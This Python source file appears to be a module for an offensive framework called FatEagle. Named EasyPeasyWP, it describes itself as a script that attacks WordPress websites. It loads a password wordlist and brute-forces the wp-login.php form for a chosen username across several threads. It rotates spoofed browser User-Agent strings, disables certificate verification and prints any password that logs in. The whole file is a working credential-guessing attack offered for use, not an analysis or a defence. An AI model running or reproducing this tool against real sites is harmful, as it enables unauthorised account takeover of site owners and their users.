import sys
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import signal
import os
import re
import ssl
import time
import random
import logging
import urllib.parse
import urllib.request
from pathlib import Path
from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor

class EasyPeasyWP:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("EasyPeasyWP","a FeScript that attacks wordpress websites.","""find username of wordpress website, find or create a passwordlist and start a bruteforce attack to wordpress websites! EasyPeasy!""",{'username': {'Body': '', 'Description': 'a username in target wp website.', 'Require': True}, 'wordlist': {'Body': '', 'Description': 'wordlist path that contains passwords.', 'Require': True}, 'loginUrl': {'Body': '', 'Description': 'wordpress login url.', 'Require': True}},"RandsX\n    FeScript Convertor: 0xDeviI")
    
    def __init__(self):
      pass
    
    def help(self):
        print(self._fs._totalDesc)
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def showSwitch(self,sw):
      print(self._fs._Opt[sw]["Body"])

    def login(self,url, username, password, timeout, proxy,userAgent,context,log):
      url = urllib.parse.urljoin(url, "/wp-login.php/")
      form = "log={}&pwd={}".format(username, password)
      form = bytes(form, "utf-8")
      headers = {
          "User-Agent" : random.choice(userAgent)
      }
      
      try:
          request = urllib.request.Request(url, data=form, headers=headers)
          
          if proxy is not None:
              request.set_proxy(proxy, ["http", "https"])
              
          with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
              if re.search("wp-admin", response.url):
                  return password
              else:
                  return False
      except urllib.error.URLError as error:
          log.critical(error)
          os._exit(0)
      except Exception as error:
          log.critical(error)
          os._exit(0)

    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      LOGGERNAME = Path(__file__).stem
      logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
      log = logging.getLogger(LOGGERNAME)
      log.setLevel(logging.INFO)
      logging.addLevelName(60, "SUCCESS")
      def success(self, message, *args, **kws):
          if self.isEnabledFor(60):
              self._log(60, message, args, **kws) 
      logging.Logger.success = success
      logging.addLevelName(70, "FAILED")
      def failed(self, message, *args, **kws):
          if self.isEnabledFor(70):
              self._log(70, message, args, **kws) 
      logging.Logger.failed = failed

      context = ssl.create_default_context()
      context.check_hostname = False
      context.verify_mode = ssl.CERT_NONE
      userAgent = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
      ]

      password = []
      content = open(self._fs._Opt["wordlist"]["Body"],"r",encoding="utf-8").readlines()
      for line in content:
          password.append(line.replace("\n", ""))

      try:
        log.info(Fore.YELLOW + "testing connection to the target" + Fore.RESET)
        # HERE
        request = urllib.request.Request(self._fs._Opt["loginUrl"]["Body"])
        urllib.request.urlopen(request, timeout=5, context=context)
        
        start_time = time.time()
        success_login = False
        
        if len(password) > 1:
            log.debug("total data in wordlist: " + str(len(password)) + " words")
        log.info(Fore.CYAN + "starting a login brute force" + Fore.RESET)
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            processed = (executor.submit(self.login, self._fs._Opt["loginUrl"]["Body"], self._fs._Opt["username"]["Body"], pwd, 5, None,userAgent,context,log) for pwd in password)
            
            for i, process in enumerate(as_completed(processed)):
                if len(password) > 1:
                  print("{}[{}][INFO] testing {} password{}".format(Fore.LIGHTYELLOW_EX,datetime.now().strftime("%H:%M:%S") ,i,Fore.RESET), end="\r")
                
                process = process.result()
                if process is not False:
                    success_login = True
                    password = process
                    break
                
            if success_login is True:
                log.success(Fore.LIGHTGREEN_EX + "Login Successful!\n                          username: " + Fore.RESET + self._fs._Opt["username"]["Body"] + Fore.LIGHTGREEN_EX + "\n                          password: " + Fore.RESET + password)
            else:
                log.failed(Fore.LIGHTRED_EX + "Can't login to dashbaord" + Fore.RESET)
            
            log.info("time taken \""+ str(int(time.time() - start_time)) +" seconds\"")
            
      except Exception as error:
        log.critical(error)

      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("FatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      self._fs._Opt[prop]["Body"] = value
